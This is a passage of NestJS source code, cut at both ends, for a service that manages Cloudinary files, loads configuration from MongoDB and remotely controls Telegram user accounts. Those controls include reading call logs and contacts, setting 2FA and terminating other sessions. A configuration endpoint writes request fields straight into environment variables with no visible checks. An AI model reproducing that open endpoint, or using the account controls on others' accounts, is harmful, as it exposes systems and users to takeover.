createNewFolder(folderName) {\n        await this.createFolder(folderName);\n        await this.uploadFilesToFolder(folderName);\n    }\n\n    async overwriteFile() {\n        const cloudinaryFileId = \"index_nbzca5.js\";\n        const localFilePath = \"./src/test.js\";\n\n        try {\n\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\n                resource_type: 'auto',\n                overwrite: true,\n                invalidate: true,\n                public_id: cloudinaryFileId\n            });\n            console.log('File overwritten successfully:', result);\n        } catch (error) {\n            parseError(error)\n        }\n\n    }\n\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\n        try {\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\n            await Promise.all(resources.map(async (resource) => {\n                try {\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\n                } catch (error) {\n                    console.log(\"Error in saving file from cloudinary\");\n                    parseError(error)\n                }\n            }));\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async createFolder(folderName) {\n        try {\n            const result = await cloudinary.v2.api.create_folder(folderName);\n\n            return result;\n        } catch (error) {\n            console.error('Error creating folder:', error);\n            throw error;\n        }\n    }\n\n    // Function to upload files from URLs to a specific folder in Cloudinary\n    async uploadFilesToFolder(folderName) {\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\n            try {\n                const result = await cloudinary.v2.uploader.upload_large(url, {\n                    folder: folderName,\n                    resource_type: 'auto',\n                    public_id: key, // Set the key as the public_id\n                });\n\n                return result;\n            } catch (error) {\n                console.error('Error uploading file:', error);\n                throw error;\n            }\n        });\n\n        try {\n            return await Promise.all(uploadPromises);\n        } catch (error) {\n            console.error('Error uploading files:', error);\n            throw error;\n        }\n    }\n\n    async printResources() {\n        try {\n            this.resources?.forEach((val, key) => {\n                console.log(key, \":\", val);\n            })\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    get(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    getBuffer(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            console.log(\"Error in getting buffer\");\n        }\n    }\n}\n\nasync function saveFile(url: string, name: string) {\n    try {\n        const extension = url.substring(url.lastIndexOf('.') + 1);\n        const rootPath = process.cwd();\n        const mypath = path.join(rootPath, `${name}.${extension}`);\n        console.log(`Downloading file: ${mypath}`);\n\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\n\n        if (res?.statusText === 'OK') {\n            if (!fs.existsSync(mypath)) {\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Saved!!`);\n            } else {\n                fs.unlinkSync(mypath);\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Replaced!!`);\n            }\n        } else {\n            throw new Error(`Unable to download file from ${url}`);\n        }\n    } catch (err) {\n        parseError(err);\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type ConfigurationDocument = Configuration & Document;\n\n@Schema({\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Configuration { }\n\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","export * from './configuration.schema';\nexport * from './init.controller';\nexport * from './init.module';\nexport * from './init.service';\n","import { Controller, Get, Body, Param, Patch, UseInterceptors } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { ConfigurationService } from './init.service';\nimport { CloudflareCache } from '../../decorators';\nimport { CloudflareCacheInterceptor } from '../../interceptors';\n\n@ApiTags('Configuration')\n@Controller('configuration')\nexport class ConfigurationController {\n  constructor(private readonly configurationService: ConfigurationService) { }\n\n  @Get()\n  @UseInterceptors(CloudflareCacheInterceptor)\n  @CloudflareCache(3600, 60)\n  @ApiOperation({ summary: 'Get configuration data' })\n  async findOne(): Promise<any> {\n    return this.configurationService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update configuration' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateClientDto: any): Promise<any> {\n    return this.configurationService.update(updateClientDto);\n  }\n\n}\n","import { Module, Global, OnModuleDestroy, OnModuleInit, Inject } from '@nestjs/common';\nimport { ConfigModule, ConfigService } from '@nestjs/config';\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\nimport { ConfigurationService } from './init.service';\nimport { ConfigurationSchema } from './configuration.schema';\nimport { ConfigurationController } from './init.controller';\nimport { Connection } from 'mongoose';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport path from 'path';\n\n@Global()\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      isGlobal: true,\n      cache: true,\n      expandVariables: true,\n      envFilePath: [path.resolve(process.cwd(), '.env'), '.env']\n    }),\n    MongooseModule.forRootAsync({\n      imports: [ConfigModule],\n      useFactory: async (configService: ConfigService) => {\n        const uri = process.env.mongouri || configService.get<string>('mongouri');\n        if (!uri) {\n          console.error('MongoDB URI is not configured. Please set the \"mongouri\" environment variable.');\n          throw new Error('MongoDB URI is not configured');\n        }\n\n        return {\n          uri,\n          maxPoolSize: 10,\n          serverSelectionTimeoutMS: 10000,\n          socketTimeoutMS: 45000,\n          connectTimeoutMS: 10000,\n          heartbeatFrequencyMS: 10000,\n          family: 4,\n          retryWrites: true,\n          retryReads: true,\n        };\n      },\n      inject: [ConfigService],\n    }),\n    MongooseModule.forFeature([{\n      name: 'configurationModule',\n      collection: 'configuration',\n      schema: ConfigurationSchema\n    }])\n  ],\n  providers: [ConfigurationService],\n  controllers: [ConfigurationController],\n  exports: [ConfigurationService, MongooseModule],\n})\nexport class InitModule implements OnModuleDestroy, OnModuleInit {\n  private static initializationStatus = {\n    isInitialized: false,\n    isInitializing: false,\n    isDestroying: false,\n  };\n\n  private connectionHealthCheckInterval?: NodeJS.Timeout;\n  private readonly HEALTH_CHECK_INTERVAL = 30000; // 30 seconds\n\n  constructor(\n    @Inject(getConnectionToken()) private readonly connection: Connection,\n    private readonly configService: ConfigService,\n  ) { }\n\n  async onModuleInit(): Promise<void> {\n    if (InitModule.initializationStatus.isInitializing || InitModule.initializationStatus.isInitialized) {\n      return;\n    }\n\n    InitModule.initializationStatus.isInitializing = true;\n\n    try {\n      console.log(`Initializing configuration module...`);\n\n      await this.validateConnection();\n      this.setupConnectionEventHandlers();\n      this.startHealthCheck();\n\n      InitModule.initializationStatus.isInitialized = true;\n      InitModule.initializationStatus.isInitializing = false;\n\n      console.log(`Started :: ${process.env.clientId}`);\n\n      // Optional: Send notification on successful startup\n      await this.sendNotification(`started :: ${process.env.clientId}`);\n\n    } catch (error) {\n      InitModule.initializationStatus.isInitializing = false;\n      console.error('Failed to initialize configuration module:', error);\n      throw error;\n    }\n  }\n\n  private async validateConnection(): Promise<void> {\n    const maxRetries = 3;\n    let retryCount = 0;\n\n    while (retryCount < maxRetries) {\n      try {\n        if (this.connection.readyState !== 1) {\n          throw new Error(`MongoDB connection not ready. Current state: ${this.connection.readyState}`);\n        }\n\n        // Test the connection with a simple operation\n        await this.connection.db.admin().ping();\n        console.log('MongoDB connection validated successfully');\n        return;\n\n      } catch (error) {\n        retryCount++;\n        console.warn(`Connection validation attempt ${retryCount}/${maxRetries} failed:`, error);\n\n        if (retryCount >= maxRetries) {\n          throw new Error(`Failed to validate MongoDB connection after ${maxRetries} attempts: ${error.message}`);\n        }\n\n        // Wait before retrying\n        await this.delay(2000 * retryCount);\n      }\n    }\n  }\n\n  private setupConnectionEventHandlers(): void {\n    this.connection.on('connected', () => {\n      console.log('MongoDB Connected');\n    });\n\n    this.connection.on('error', (error) => {\n      console.error('MongoDB Connection Error:', error);\n    });\n\n    this.connection.on('disconnected', () => {\n      console.warn('MongoDB Disconnected');\n    });\n\n    this.connection.on('reconnected', () => {\n      console.log('MongoDB Reconnected');\n    });\n\n    this.connection.on('close', () => {\n      console.log('MongoDB Connection Closed');\n    });\n  }\n\n  private startHealthCheck(): void {\n    this.connectionHealthCheckInterval = setInterval(async () => {\n      try {\n        if (this.connection.readyState === 1) {\n          await this.connection.db.admin().ping();\n        }\n      } catch (error) {\n        console.error('MongoDB health check failed:', error);\n      }\n    }, this.HEALTH_CHECK_INTERVAL);\n  }\n\n  private stopHealthCheck(): void {\n    if (this.connectionHealthCheckInterval) {\n      clearInterval(this.connectionHealthCheckInterval);\n      this.connectionHealthCheckInterval = undefined;\n    }\n  }\n\n  private async sendNotification(message: string): Promise<void> {\n    try {\n      const url = `${notifbot()}&text=${encodeURIComponent(message)}`;\n      await fetchWithTimeout(url, { timeout: 5000 });\n    } catch (error) {\n      console.warn('Failed to send notification:', error);\n      // Don't throw - notification failure shouldn't break initialization\n    }\n  }\n\n  private delay(ms: number): Promise<void> {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n\n  async onModuleDestroy(): Promise<void> {\n    if (InitModule.initializationStatus.isDestroying) {\n      return;\n    }\n\n    InitModule.initializationStatus.isDestroying = true;\n\n    try {\n      console.log('Init Module destroying...');\n\n      this.stopHealthCheck();\n      await this.sendNotification(`closed :: ${process.env.clientId}`);\n\n      if (this.connection && this.connection.readyState !== 0) {\n        console.log('Closing MongoDB connection...');\n        await this.connection.close(true);\n      }\n\n    } catch (error) {\n      console.error('Error during module destruction:', error);\n    } finally {\n      InitModule.initializationStatus = {\n        isInitialized: false,\n        isInitializing: false,\n        isDestroying: false,\n      };\n    }\n  }\n\n  // Public method to check initialization status\n  static getInitializationStatus() {\n    return { ...InitModule.initializationStatus };\n  }\n\n  // Public method to check if module is ready\n  static isReady(): boolean {\n    return InitModule.initializationStatus.isInitialized && !InitModule.initializationStatus.isDestroying;\n  }\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Configuration } from './configuration.schema';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { ConfigService } from '@nestjs/config';\nimport { Logger } from '../../utils';\n\n@Injectable()\nexport class ConfigurationService implements OnModuleInit {\n    private readonly logger = new Logger(ConfigurationService.name);\n    private static initialized = false;\n\n    constructor(\n        @InjectModel('configurationModule') private configurationModel: Model<Configuration>,\n        private configService: ConfigService\n    ) { }\n\n    async onModuleInit() {\n        if (ConfigurationService.initialized) {\n            return;\n        }\n\n        try {\n            await this.initializeConfiguration();\n            ConfigurationService.initialized = true;\n        } catch (error) {\n            this.logger.error('Failed to initialize configuration', error);\n            throw error;\n        }\n    }\n\n    private async initializeConfiguration() {\n        // this.logger.log('Initializing configuration service...');\n        await this.setEnv();\n        await this.notifyStart();\n        // this.logger.log('Configuration service initialized successfully');\n    }\n\n    private async notifyStart() {\n        try {\n            const clientId = process.env.clientId || this.configService.get('clientId');\n            if (!clientId) {\n                this.logger.warn('No clientId found in environment or configuration');\n                return;\n            }\n            await fetchWithTimeout(\n                `${notifbot()}&text=${encodeURIComponent(`Started :: ${clientId}`)}`\n            );\n        } catch (error) {\n            this.logger.warn('Failed to send start notification', error);\n        }\n    }\n\n    async findOne(): Promise<Configuration> {\n        const configuration = await this.configurationModel.findOne({}).lean().exec();\n        if (!configuration) {\n            throw new NotFoundException('Configuration not found');\n        }\n        return configuration;\n    }\n\n    async setEnv() {\n        this.logger.log('Setting environment variables...');\n        const configuration = await this.configurationModel.findOne({}, { _id: 0 }).lean();\n\n        if (!configuration) {\n            this.logger.warn('No configuration found in database, using environment variables only');\n            return;\n        }\n\n        for (const [key, value] of Object.entries(configuration)) {\n            if (value !== undefined && value !== null) {\n                // Don't override existing environment variables\n                if (!process.env[key]) {\n                    process.env[key] = String(value);\n                    this.logger.debug(`Set environment variable: ${key}`);\n                }\n            }\n        }\n\n        this.logger.log('Finished setting environment variables');\n    }\n\n    async update(updateDto: Partial<Configuration>): Promise<Configuration> {\n        const { _id, ...updateData } = updateDto as any;\n\n        try {\n            const updatedConfig = await this.configurationModel.findOneAndUpdate(\n                {},\n                { $set: updateData },\n                { new: true, upsert: true, lean: true }\n            ).exec();\n\n            if (!updatedConfig) {\n                throw new NotFoundException('Failed to update configuration');\n            }\n\n            // Update environment variables with new values\n            Object.entries(updateData).forEach(([key, value]) => {\n                if (value !== undefined && value !== null) {\n                    process.env[key] = String(value);\n                }\n            });\n\n            return updatedConfig;\n        } catch (error) {\n            this.logger.error('Failed to update configuration', error);\n            throw error;\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res, Delete, Put, UseInterceptors, UploadedFile, Patch, ParseArrayPipe } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse, ApiConsumes } from '@nestjs/swagger';\nimport { Response } from 'express';\nimport { TelegramService } from './Telegram.service';\nimport {\n    SendMediaDto,\n    SendMediaAlbumDto,\n    GroupSettingsDto,\n    GroupMemberOperationDto,\n    AdminOperationDto,\n    ChatCleanupDto,\n    PrivacySettingsDto,\n    ProfilePhotoDto,\n    ScheduleMessageDto,\n    BatchProcessDto,\n    BatchOperationType,\n    ForwardBatchDto,\n    ContactExportImportDto,\n    ContactBlockListDto,\n    AddContactsDto,\n    MediaType,\n    createGroupDto,\n    ViewOnceMediaDto,\n    MediaSourceType,\n    CreateTgBotDto\n} from './dto';\nimport { MediaMetadataDto } from './dto/metadata-operations.dto';\nimport { CreateChatFolderDto } from './dto/create-chat-folder.dto';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { ChatStatistics } from '../../interfaces/telegram';\nimport { ConnectionStatusDto, GetClientOptionsDto } from './dto/connection-management.dto';\nimport { FileInterceptor } from '@nestjs/platform-express';\nimport * as multer from 'multer';\nimport axios from 'axios';\nimport { connectionManager } from './utils/connection-manager';\nimport { SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';\nimport { DeleteHistoryDto } from './dto/delete-chat.dto';\nimport { UpdateUsernameDto } from './dto/update-username.dto';\nimport { SendTgMessageDto } from './dto/send-message.dto';\nimport { UpdateProfileDto } from './dto/update-profile.dto';\nimport bigInt from 'big-integer';\n\n@Controller('telegram')\n@ApiTags('Telegram')\nexport class TelegramController {\n    constructor(private readonly telegramService: TelegramService) {}\n\n    @Get('connect/:mobile')\n    @ApiOperation({ summary: 'Connect to Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'autoDisconnect', description: 'Whether to auto disconnect the client after period of inactivity', required: false, type: Boolean, default: true })\n    @ApiQuery({ name: 'handler', description: 'Whether to use event handler', required: false, type: Boolean, default: true })\n    @ApiResponse({ type: Object, schema: { properties: { message: { type: 'string' } } } })\n    async connect(\n        @Param('mobile') mobile: string,\n        @Query('autoDisconnect') autoDisconnect?: boolean,\n        @Query('handler') handler?: boolean,\n    ): Promise<{ message: string }> {\n        const options: GetClientOptionsDto = { autoDisconnect, handler };\n        await this.telegramService.connect(mobile, options);\n        return { message: 'Connected successfully' };\n    }\n\n    @Get('disconnect/:mobile')\n    @ApiOperation({ summary: 'Disconnect from Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object, schema: { properties: { message: { type: 'string' } } } })\n    async disconnect(@Param('mobile') mobile: string): Promise<{ message: string }> {\n        await this.telegramService.disconnect(mobile);\n        return { message: 'Disconnected successfully' };\n    }\n\n    @Get('disconnect-all')\n    @ApiOperation({ summary: 'Disconnect all clients' })\n    @ApiResponse({ type: Object, schema: { properties: { message: { type: 'string' } } } })\n    async disconnectAll(): Promise<{ message: string }> {\n        await this.telegramService.disconnectAll();\n        return { message: 'All clients disconnected successfully' };\n    }\n\n    @Get('connection/stats')\n    @ApiOperation({ summary: 'Get connection statistics' })\n    getConnectionStats() {\n        return this.telegramService.getConnectionStats();\n    }\n\n    @Get('connection/state/:mobile')\n    @ApiOperation({ summary: 'Get connection state for a client' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: ConnectionStatusDto })\n    getClientState(@Param('mobile') mobile: string): ConnectionStatusDto | undefined {\n        return this.telegramService.getClientState(mobile);\n    }\n\n    @Get('connection/count')\n    @ApiOperation({ summary: 'Get active connection count' })\n    @ApiResponse({ type: Number })\n    getActiveConnectionCount(): number {\n        return this.telegramService.getActiveConnectionCount();\n    }\n\n    @Get('me/:mobile')\n    @ApiOperation({ summary: 'Get current user profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async getMe(@Param('mobile') mobile: string) {\n        return this.telegramService.getMe(mobile);\n    }\n\n    @Get('entity/:mobile/:entity')\n    @ApiOperation({ summary: 'Get Entity profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiParam({ name: 'entity', description: 'Entity identifier', required: true })\n    @ApiResponse({ type: Object })\n    async getEntity(@Param('mobile') mobile: string, @Param('entity') entity: string) {\n        return this.telegramService.getEntity(mobile, entity);\n    }\n\n    @Post('profile/update/:mobile')\n    @ApiOperation({ summary: 'Update profile information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: UpdateProfileDto })\n    @ApiResponse({ type: Object })\n    async updateProfile(@Param('mobile') mobile: string, @Body() updateProfileDto: UpdateProfileDto) {\n        return this.telegramService.updateNameandBio(mobile, updateProfileDto.firstName, updateProfileDto.about);\n    }\n\n    @Post('profile/photo/:mobile')\n    @ApiOperation({ summary: 'Set profile photo' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ProfilePhotoDto })\n    @ApiResponse({ type: Object })\n    async setProfilePhoto(@Param('mobile') mobile: string, @Body() photoDto: ProfilePhotoDto) {\n        return this.telegramService.setProfilePic(mobile, photoDto.name);\n    }\n\n    @Delete('profile/photos/:mobile')\n    @ApiOperation({ summary: 'Delete all profile photos' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async deleteProfilePhotos(@Param('mobile') mobile: string) {\n        return this.telegramService.deleteProfilePhotos(mobile);\n    }\n\n    @Get('messages/:mobile')\n    @ApiOperation({ summary: 'Get chat messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    @ApiResponse({ type: Object })\n    async getMessages(@Param('mobile') mobile: string, @Query('chatId') chatId: string, @Query('limit') limit?: number) {\n        return this.telegramService.getMessages(mobile, chatId, limit);\n    }\n\n    @Post('message/:mobile')\n    @ApiOperation({ summary: 'Send a Telegram message as a user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the user account to send the message from', required: true })\n    @ApiBody({ type: SendTgMessageDto })\n    @ApiResponse({ type: Object })\n    async sendMessage(@Param('mobile') mobile: string, @Body() dto: SendTgMessageDto) {\n        return this.telegramService.sendMessage(mobile, dto);\n    }\n\n    @Post('messages/forward/:mobile')\n    @ApiOperation({ summary: 'Forward messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ForwardBatchDto })\n    @ApiResponse({ type: Object })\n    async forwardMessage(@Param('mobile') mobile: string, @Body() forwardDto: ForwardBatchDto) {\n        return this.telegramService.forwardBulkMessages(mobile, forwardDto.fromChatId, forwardDto.toChatId, forwardDto.messageIds);\n    }\n\n    @Post('batch-process/:mobile')\n    @ApiOperation({ summary: 'Process operations in batches' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: BatchProcessDto })\n    @ApiResponse({ type: Object })\n    async processBatchMessages(@Param('mobile') mobile: string, @Body() batchOp: BatchProcessDto) {\n        return this.telegramService.processBatch(\n            batchOp.items,\n            batchOp.batchSize || 20,\n            async (batch) => {\n                switch (batchOp.operation) {\n                    case BatchOperationType.FORWARD:\n                        for (const item of batch) {\n                            if ('messageId' in item && item.fromChatId && item.toChatId) {\n                                await this.telegramService.forwardMessage(mobile, item.toChatId, item.fromChatId, item.messageId);\n                            }\n                        }\n                        break;\n                    case BatchOperationType.DELETE:\n                        for (const item of batch) {\n                            await this.telegramService.deleteChat(mobile, { peer: item.chatId, justClear: true });\n                        }\n                        break;\n                    default:\n                        throw new BadRequestException('Unsupported batch operation');\n                }\n            },\n            batchOp.delayMs\n        );\n    }\n\n    @Get('messages/search/:mobile')\n    @ApiOperation({ summary: 'Search messages in Telegram', description: 'Search for messages in a specific chat or globally across all chats' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ type: SearchMessagesDto })\n    @ApiResponse({ type: SearchMessagesResponseDto })\n    async searchMessages(@Param('mobile') mobile: string, @Query() queryParams: SearchMessagesDto): Promise<SearchMessagesResponseDto> {\n        return this.telegramService.searchMessages(mobile, queryParams);\n    }\n\n    @Get('channels/:mobile')\n    @ApiOperation({ summary: 'Get channel information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'includeIds', required: false, type: Boolean })\n    @ApiResponse({ type: Object })\n    async getChannelInfo(@Param('mobile') mobile: string, @Query('includeIds') includeIds?: boolean) {\n        return this.telegramService.getChannelInfo(mobile, includeIds);\n    }\n\n    @Post('forwardMediatoMe/:mobile')\n    @ApiOperation({ summary: 'Forward media messages to me' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel username or ID', required: false })\n    @ApiQuery({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false })\n    @ApiResponse({ type: Object })\n    async forwardMedia(@Param('mobile') mobile: string, @Query('channel') channel?: string, @Query('fromChatId') fromChatId?: string) {\n        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n        return this.telegramService.forwardMedia(mobile, channel, fromChatId);\n    }\n\n    @Post('channels/leave/:mobile')\n    @ApiOperation({ summary: 'Leave channel' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel ID/username', required: true })\n    @ApiResponse({ type: Object })\n    async leaveChannel(@Param('mobile') mobile: string, @Query('channel') channel: string) {\n        return this.telegramService.leaveChannel(mobile, channel);\n    }\n\n    @Patch('username/:mobile')\n    @ApiOperation({ summary: 'Update the Telegram username of a user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the user whose username should be updated', required: true })\n    @ApiBody({ type: UpdateUsernameDto })\n    @ApiResponse({ type: Object })\n    async updateUsername(@Param('mobile') mobile: string, @Body() updateUsernameDto: UpdateUsernameDto) {\n        return this.telegramService.updateUsername(mobile, updateUsernameDto.newUsername);\n    }\n\n    @Post('2fa/:mobile')\n    @ApiOperation({ summary: 'Setup two-factor authentication' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async setup2FA(@Param('mobile') mobile: string) {\n        return this.telegramService.set2Fa(mobile);\n    }\n\n    @Post('privacy/:mobile')\n    @ApiOperation({ summary: 'Update privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async updatePrivacy(@Param('mobile') mobile: string) {\n        return this.telegramService.updatePrivacy(mobile);\n    }\n\n    @Post('privacy/batch/:mobile')\n    @ApiOperation({ summary: 'Update multiple privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: PrivacySettingsDto })\n    @ApiResponse({ type: Object })\n    async updatePrivacyBatch(@Param('mobile') mobile: string, @Body() settings: PrivacySettingsDto) {\n        return this.telegramService.updatePrivacyBatch(mobile, settings);\n    }\n\n    @Get('sessions/:mobile')\n    @ApiOperation({ summary: 'Get active sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async getActiveSessions(@Param('mobile') mobile: string) {\n        return this.telegramService.getAuths(mobile);\n    }\n\n    @Delete('sessions/:mobile')\n    @ApiOperation({ summary: 'Terminate other sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async terminateOtherSessions(@Param('mobile') mobile: string) {\n        return this.telegramService.removeOtherAuths(mobile);\n    }\n\n    @Post('sessions/new/:mobile')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async createNewSession(@Param('mobile') mobile: string) {\n        return this.telegramService.createNewSession(mobile);\n    }\n\n    @Get('session/info/:mobile')\n    @ApiOperation({ summary: 'Get session information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async getSessionInfo(@Param('mobile') mobile: string) {\n        return this.telegramService.getSessionInfo(mobile);\n    }\n\n    @Post('session/terminate/:mobile')\n    @ApiOperation({ summary: 'Terminate specific session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ schema: { type: 'object', properties: { hash: { type: 'string' }, type: { type: 'string', enum: ['app', 'web'] }, exceptCurrent: { type: 'boolean' } } } })\n    @ApiResponse({ type: Object })\n    async terminateSession(@Param('mobile') mobile: string, @Body() data: { hash: string; type: 'app' | 'web'; exceptCurrent?: boolean }) {\n        return this.telegramService.terminateSession(mobile, data);\n    }\n\n    @Get('monitoring/status')\n    @ApiOperation({ summary: 'Get service health and connection status' })\n    @ApiResponse({ type: ConnectionStatusDto })\n    async getConnectionStatus() {\n        return { status: await this.telegramService.getConnectionStatus() };\n    }\n\n    @Get('monitoring/calllog/:mobile')\n    @ApiOperation({ \n        summary: 'Get call log statistics with enhanced filtering',\n        description: 'Retrieves comprehensive call statistics including incoming/outgoing calls, video/audio breakdown, ' +\n                     'and per-chat call counts. Uses server-side filtering for optimal performance. ' +\n                     'Supports pagination via limit parameter (default: 1000, max: 10000).'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({\n        name: 'limit',\n        required: false,\n        type: Number,\n        description: 'Maximum number of calls to analyze (default: 1000, max: 10000)',\n        example: 1000,\n        minimum: 1,\n        maximum: 10000\n    })\n    @ApiQuery({\n        name: 'includeCallLog',\n        required: false,\n        type: Boolean,\n        description: 'If true, each chat in the response includes a callLog array with per-call details (messageId, date, duration, video, outgoing). Default: false.',\n        example: false\n    })\n    @ApiResponse({\n        status: 200,\n        description: 'Call log statistics retrieved successfully',\n        schema: {\n            type: 'object',\n            properties: {\n                totalCalls: { type: 'number', description: 'Total number of calls' },\n                outgoing: { type: 'number', description: 'Total outgoing calls' },\n                incoming: { type: 'number', description: 'Total incoming calls' },\n                video: { type: 'number', description: 'Total video calls' },\n                audio: { type: 'number', description: 'Total audio calls' },\n                chats: {\n                    type: 'array',\n                    description: 'Per-chat call summary with identity, call stats, media counts, and call log',\n                    items: {\n                        type: 'object',\n                        properties: {\n                            chatId: { type: 'string' },\n                            phone: { type: 'string' },\n                            username: { type: 'string' },\n                            name: { type: 'string' },\n                            peerType: { type: 'string', enum: ['user', 'group', 'channel'] },\n                            calls: {\n                                type: 'object',\n                                properties: {\n                                    total: { type: 'number' },\n                                    outgoing: { type: 'number' },\n                                    incoming: { type: 'number' },\n                                    video: { type: 'number' },\n                                    audio: { type: 'number' }\n                                }\n                            },\n                            totalMessages: { type: 'number' },\n                            photoCount: { type: 'number' },\n                            videoCount: { type: 'number' },\n                            callLog: {\n                                type: 'array',\n                                items: {\n                                    type: 'object',\n                                    properties: {\n                                        messageId: { type: 'number' },\n                                        date: { type: 'number' },\n                                        durationSeconds: { type: 'number' },\n                                        video: { type: 'boolean' },\n                                        outgoing: { type: 'boolean' }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    })\n    @ApiResponse({ status: 400, description: 'Bad Request - invalid limit parameter' })\n    @ApiResponse({ status: 500, description: 'Internal Server Error' })\n    async getCallLogStats(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number,\n        @Query('includeCallLog') includeCallLog?: string\n    ) {\n        if (limit !== undefined && (limit < 1 || limit > 10000)) {\n            throw new BadRequestException('Limit must be between 1 and 10000.');\n        }\n        const includeCallLogBool = includeCallLog === 'true' || includeCallLog === '1';\n        return this.telegramService.getCallLog(mobile, limit, includeCallLogBool);\n    }\n\n    @Post('contacts/add-bulk/:mobile')\n    @ApiOperation({ summary: 'Add multiple contacts in bulk' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AddContactsDto })\n    @ApiResponse({ type: Object })\n    async addContactsBulk(@Param('mobile') mobile: string, @Body() contactsDto: AddContactsDto) {\n        return this.telegramService.addContacts(mobile, contactsDto.phoneNumbers, contactsDto.prefix);\n    }\n\n    @Get('contacts/:mobile')\n    @ApiOperation({ summary: 'Get all contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async getContacts(@Param('mobile') mobile: string) {\n        return this.telegramService.getContacts(mobile);\n    }\n\n    @Post('media/send/:mobile')\n    @ApiOperation({ \n        summary: 'Send media message',\n        description: 'Send a photo or file to a chat. Maximum file size is 100MB. Supports images, videos, and documents.'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the 